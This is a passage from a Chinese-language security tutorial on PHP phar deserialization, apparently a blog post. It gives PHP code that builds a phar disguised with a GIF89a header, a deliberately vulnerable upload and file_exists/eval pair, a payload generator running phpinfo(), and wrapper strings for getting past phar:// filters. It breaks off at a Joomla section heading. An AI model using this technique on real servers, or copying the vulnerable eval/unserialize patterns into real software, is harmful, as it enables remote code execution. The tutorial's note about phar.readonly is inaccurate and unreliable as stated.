&lt;p&gt;phar 就是 php 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与 file://，php:// 等类似，也是一种流包装器。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;phar 文件有四部分构成&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. a stub&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;识别 phar 拓展的标识，格式为：xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，对应的函数 Phar::setStub。前期内容不限，但必须以 __HALT_COMPILER ();?&amp;gt; 结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. a manifest describing the contents&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用的核心部分。对应函数 Phar::setMetadata— 设置 phar 归档元数据。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. the file contents&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;被压缩文件的内容。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4. [optional] a signature for verifying Phar integrity (phar file format only)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;签名，放在文件末尾。对应函数 Phar :: stopBuffering— 停止缓冲对 Phar 存档的写入请求，并将更改保存到磁盘。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这里有两个关键点：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;文件标识&lt;/strong&gt;，必须以 __HALT_COMPILER ();?&amp;gt; 结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者 pdf 文件来绕过一些上传限制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;反序列化&lt;/strong&gt;，phar 存储的 meta-data 信息以序列化方式存储，当文件操作函数通过 phar:// 伪协议解析 phar 文件时，文件内容会被解析成 phar 对象，然后 phar 对象内的 meta-data 会被反序列化。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;meta-data 是用 serialize () 生成并保存在 phar 文件中，当内核调用 phar_parse_metadata () 解析 meta-data 数据时，会调用 php_var_unserialize () 对其进行反序列化操作，因此会造成反序列化漏洞。&lt;/p&gt;
&lt;p&gt;而在一些上传点，我们可以更改 phar 的文件头并且修改其后缀名绕过检测，如：test.gif，里面的 meta-data 却是我们提前写入的恶意代码，而且可利用的文件操作函数又很多，所以这是一种不错的绕过 + 执行的方法。&lt;/p&gt;
&lt;p&gt;生成 phar 文件的代码如下：&lt;/p&gt;
&lt;p&gt;phar.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //反序列化payload构造&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class TestObject &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @unlink(&amp;quot;phar.phar&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //实例一个phar对象供后续操作，后缀名必须为phar&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $phar = new Phar(&amp;quot;phar.phar&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //开始缓冲对phar的写操作 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $phar-&amp;gt;startBuffering();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&amp;gt; 结尾&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //将反序列化的对象放入该文件中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $o = new TestObject();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $o-&amp;gt;data=&amp;#x27;i am bmjoker&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //将自定义的归档元数据meta-data存入manifest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $phar-&amp;gt;setMetadata($o);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //phar本质上是个压缩包，所以要添加压缩的文件和文件内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;bmjoker&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //停止缓冲对phar的写操作&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $phar-&amp;gt;stopBuffering();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以明显的看到 meta-data 是以序列化的形式存储的，有序列化数据必然会有反序列化操作，php 一大部分的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;em&gt;&lt;strong&gt;* 受影响的文件操作函数列表 *&lt;/strong&gt;&lt;/em&gt;&lt;/th&gt;
&lt;th&gt;** **&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;fileatime&lt;/td&gt;
&lt;td&gt;filectime&lt;/td&gt;
&lt;td&gt;file_exists&lt;/td&gt;
&lt;td&gt;file_get_contents&lt;/td&gt;
&lt;td&gt;touch&lt;/td&gt;
&lt;td&gt;get_meta_tags&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;file_put_contents&lt;/td&gt;
&lt;td&gt;file&lt;/td&gt;
&lt;td&gt;filegroup&lt;/td&gt;
&lt;td&gt;fopen&lt;/td&gt;
&lt;td&gt;hash_file&lt;/td&gt;
&lt;td&gt;get_headers&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;fileinode&lt;/td&gt;
&lt;td&gt;filemtime&lt;/td&gt;
&lt;td&gt;fileowner&lt;/td&gt;
&lt;td&gt;fileperms&lt;/td&gt;
&lt;td&gt;md5_file&lt;/td&gt;
&lt;td&gt;getimagesize&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;is_dir&lt;/td&gt;
&lt;td&gt;is_executable&lt;/td&gt;
&lt;td&gt;is_file&lt;/td&gt;
&lt;td&gt;is_link&lt;/td&gt;
&lt;td&gt;sha1_file&lt;/td&gt;
&lt;td&gt;getimagesizefromstring&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;is_readable&lt;/td&gt;
&lt;td&gt;is_writable&lt;/td&gt;
&lt;td&gt;is_writeable&lt;/td&gt;
&lt;td&gt;parse_ini_file&lt;/td&gt;
&lt;td&gt;hash_update_file&lt;/td&gt;
&lt;td&gt;imageloadfont&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;copy&lt;/td&gt;
&lt;td&gt;unlink&lt;/td&gt;
&lt;td&gt;stat&lt;/td&gt;
&lt;td&gt;readfile&lt;/td&gt;
&lt;td&gt;hash_hmac_file&lt;/td&gt;
&lt;td&gt;exif_imagetype&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;这些函数里面可以使用 phar 协议，当然还有常用的文件包含的几个函数 include、include_once、requrie、require_once&lt;/p&gt;
&lt;p&gt;对刚才生成的 phar 使用文件操作函数实现反序列化读取：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class TestObject&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        function __destruct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            echo $this-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $filename =  &amp;quot;phar://phar.phar/test.txt&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    file_get_contents($filename);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;0x10&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x10&#34;&gt;#&lt;/a&gt; 0x10&lt;/h4&gt;
&lt;p&gt;upload_file.php：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if (($_FILES[&amp;quot;file&amp;quot;][&amp;quot;type&amp;quot;]==&amp;quot;image/gif&amp;quot;)&amp;amp;&amp;amp;(substr($_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;], strrpos($_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;], &amp;#x27;.&amp;#x27;)+1))== &amp;#x27;gif&amp;#x27;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;quot;Upload: &amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;quot;Type: &amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;type&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;quot;Temp file: &amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp_name&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (file_exists(&amp;quot;upload_file/&amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;] . &amp;quot; already exists. &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        move_uploaded_file($_FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp_name&amp;quot;],&amp;quot;upload_file/&amp;quot; .$_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;quot;Stored in: &amp;quot; . &amp;quot;upload_file/&amp;quot; . $_FILES[&amp;quot;file&amp;quot;][&amp;quot;name&amp;quot;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo &amp;quot;Invalid file,you can only upload gif&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;upload_file.html&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form action=&amp;quot;http://127.0.0.1/upload_file.php&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;Upload&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;file_un.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$filename=$_GET[&amp;#x27;filename&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class AnyClass&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $output = &amp;#x27;echo &amp;quot;ok&amp;quot;;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __destruct()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        eval($this -&amp;gt; output);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file_exists($filename);   // 漏洞点&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;upload_file.php 对上传文件的类型，后缀进行了判断，限制为 GIF 文件。而 file_un.php 文件主要使用 file_exists () 判断文件是否存在，并且存在魔术方法__destruct ()。大概思路为首先根据 file_un.php 写一个生成 phar 的 php 文件，当然需要绕过为 gif 的限制，所以需要加 GIF89a，然后我们访问这个 php 文件后，生成了 phar.phar，修改后缀为 gif，上传到服务器，然后利用 file_exists，使用 phar:// 执行代码。&lt;/p&gt;
&lt;p&gt;构造 payload 代码 eval.php：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class AnyClass&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $output = &amp;#x27;echo &amp;quot;ok&amp;quot;;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __destruct()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        eval($this -&amp;gt; output);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$phar = new Phar(&amp;#x27;phar.phar&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$phar -&amp;gt; startBuffering();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$phar -&amp;gt; setStub(&amp;#x27;GIF89a&amp;#x27;.&amp;#x27;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$phar -&amp;gt; addFromString(&amp;#x27;test.txt&amp;#x27;,&amp;#x27;test&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$object = new AnyClass();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$object -&amp;gt; output= &amp;#x27;phpinfo();&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$phar -&amp;gt; setMetadata($object);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$phar -&amp;gt; stopBuffering();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问 eval.php，会在当前目录生成 phar.phar，然后修改后缀 gif&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;漏洞利用条件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;\1. phar 文件要能够上传到服务器端（如 GET、POST），并且要有 file_exists ()，fopen ()，file_get_contents ()，include () 等文件操作的函数&lt;/p&gt;
&lt;p&gt;\2. 要有可用的魔术方法作为 &amp;quot;跳板&amp;quot;；&lt;/p&gt;
&lt;p&gt;\3. 文件操作函数的参数可控，且：，/，phar 等特殊字符没有被过滤。&lt;/p&gt;
&lt;p&gt;虽然某些函数能够支持 phar:// 的协议，但是如果目标服务器没有关闭 phar.readonly 时，就不能正常执行反序列化操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在禁止 phar 开头的情况下的替代方法:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;compress.zlib://phar://phar.phar/test.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;compress.bzip2://phar://phar.phar/test.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;php://filter/read=convert.base64-encode/resource=phar://phar.phar/test.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;虽然会报 warning，但是还是会执行。&lt;/p&gt;
&lt;h3 id=&#34;joomla-346对象逃逸反序列化执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#joomla-346对象逃逸反序列化执行&#34;&gt;#&lt;/a&gt; Joomla  3.4.6 对象逃逸反序列化执行&lt;/h3&gt;
&lt;p&gt;Joomla 反序列化漏洞的主要原因是：&lt;/p&gt;
&lt;blockquote&gt;
